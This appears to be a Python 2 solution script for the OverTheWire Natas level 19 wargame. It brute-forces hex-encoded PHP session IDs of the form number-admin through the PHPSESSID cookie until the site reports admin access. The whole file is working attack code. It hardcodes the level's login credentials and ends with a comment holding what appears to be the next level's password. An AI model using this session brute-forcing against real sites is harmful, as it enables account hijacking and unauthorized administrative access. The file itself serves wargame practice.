import requests

user='natas19'
password='4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'
url='http://natas19.natas.labs.overthewire.org/'

session=requests.Session()

for i in range(0,640) :
    ascii_sessionId=str(i)+"-admin"
    print "trying with : "+ascii_sessionId
    response=session.post(url,cookies = {"PHPSESSID" : str(ascii_sessionId.encode('hex'))},auth=(user,password))
    if 'You are an admin' in response.text :
        print response.text
        sys.exit()
#eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
